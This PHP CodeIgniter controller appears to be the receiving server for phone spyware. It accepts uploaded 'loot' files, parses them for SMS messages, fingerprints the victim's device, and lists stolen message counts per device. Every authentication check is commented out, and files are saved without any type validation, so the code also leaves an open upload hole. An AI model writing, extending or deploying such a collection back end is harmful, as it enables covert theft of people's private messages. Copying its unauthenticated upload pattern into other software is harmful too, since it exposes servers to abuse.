<?php

namespace App\Controllers;

use CodeIgniter\API\ResponseTrait;
use CodeIgniter\Controller;

use App\Models\ModUploads;
use App\Models\ModCryption;


class Upload extends BaseController//\IonAuth\Controllers\Auth
{
    use ResponseTrait;

    public function upload(){
        $mod_upload = new ModUploads();
        $mod_cryption = new ModCryption();
        $session = session();

        helper("filesystem");

        if (empty($session->get('user_name'))){
            //return "Not Logged In";
        }

        if ($this->request->getPost()){
            $uploaded_Token = $this->request->getVar('varToken');
            $uploaded_DevId = $this->request->getVar('varDevId');

            $uploaded_File = $this->request->getFile('varLoot');

            $uploaded_File->move(WRITEPATH . 'uploads/txt_loot');

            $data = [
                'loot_Name' =>  $uploaded_File->getName(),
                'loot_Type'  => $uploaded_File->getClientMimeType(),
                'loot_Extension'  => $uploaded_File->getClientExtension(),
                'loot_Size'  => $uploaded_File->getSize(),
                'loot_Owner'  => $uploaded_Token,
                'loot_Device'  => $uploaded_DevId,
                'loot_Created'  => time()
            ];

            $pushed = $mod_upload->file_upload($data);
            $loot_id = $mod_upload->loot_last_uploaded();
            $mod_upload->loot_parse_sms($loot_id);
            
            if ($pushed){
                return $this->respond([
                    'status' => 1,
                    'message' => "File Uploaded Successfully"
                ]);
            }else{
                return $this->respond([
                    'status' => 0,
                    'message' => "File Uploaded has encountered an error"
                ]);
            }

        }else{
            return $this->respond([
                'status' => 2,
                'message' => "Unexpected request sent"
            ]);
        }
    }

    public function device_print(){
        $mod_upload = new ModUploads();
        $session = session();

        if (empty($session->get('user_name'))){
            //echo "Not Logged In";
        }

        if ($this->request->getPost()){

            $d_info['p_Device'] = $this->request->getVar('p_Device');
            $d_info['p_Product'] = $this->request->getVar('p_Product');
            $d_info['p_Bootloader'] = $this->request->getVar('p_Bootloader');
            $d_info['p_Type'] = $this->request->getVar('p_Type');
            $d_info['p_Tags'] = $this->request->getVar('p_Tags');
            $d_info['p_Host'] = $this->request->getVar('p_Host');
            $d_info['p_Display'] = $this->request->getVar('p_Display');
            $d_info['p_Hardware'] = $this->request->getVar('p_Hardware');
            $d_info['p_Fingerprint'] = $this->request->getVar('p_Fingerprint');
            $d_info['p_Manufacturer'] = $this->request->getVar('p_Manufacturer');
            $d_info['p_Brand'] = $this->request->getVar('p_Brand');
            $d_info['p_Board'] = $this->request->getVar('p_Board');
            $d_info['p_User'] = $this->request->getVar('p_User');
            $d_info['p_Model'] = $this->request->getVar('p_Model');
            $d_info['p_Time'] = $this->request->getVar('p_Time');

            $dev_check = $mod_upload->device_check_print($d_info);
            if (empty($dev_check)){
                $dev_make = $mod_upload->device_make_print($d_info);
                if ($dev_make){
                    $dev_check = $mod_upload->device_check_print($d_info);
                    return $this->respond([
                        'status' => 1,
                        'message' => "New Id assigned device_id as ",
                        'print_id' => $dev_check[0]->p_Id,
                        'time' => time()
                    ]);
                }else{}
            }else{
                return $this->respond([
                    'status' => 1,
                    'message' => "Old Id re-assigned device_id as ",
                    'print_id' => $dev_check[0]->p_Id,
                    'time' => time()
                ]);
            }
        }else{
            return $this->respond([
                'status' => 2,
                'message' => "Unexpected request sent"
            ]);
        }
    }

    public function upload_listing(){
        $mod_upload = new ModUploads();
        $mod_cryption = new ModCryption();
        $session = session();

        if (empty($session->get('user_name'))){
            //echo "Not Logged In";
        }

        $loot_array = array();
        $loot_list = $mod_upload->file_listing();
        
        foreach ($loot_list as $loot_info) {
            $loot_meta = $mod_upload->loot_summary($loot_info->loot_Id);
            $data = [
                'loot_summary_Name' =>  $loot_info->loot_Name,
                'loot_summary_Type'  => $loot_info->loot_Type,
                'loot_summary_Extension'  => $loot_info->loot_Extension,
                'loot_summary_Size'  => $loot_info->loot_Size,
                'loot_summary_Owner'  => $loot_info->loot_Owner,
                'loot_summary_Device'  => $loot_info->loot_Device,
                'loot_summary_Created'  => $loot_info->loot_Created,

                'loot_summary_Count'  => $loot_meta[0]->info_Count,
                'loot_summary_Received'  => $loot_meta[0]->info_Received,
                'loot_summary_Sent'  => $loot_meta[0]->info_Sent,
                'loot_summary_Unknown'  => $loot_meta[0]->info_Unknown
            ];
            array_push($loot_array,$data);
        }

        print_r($loot_array);
    }
}
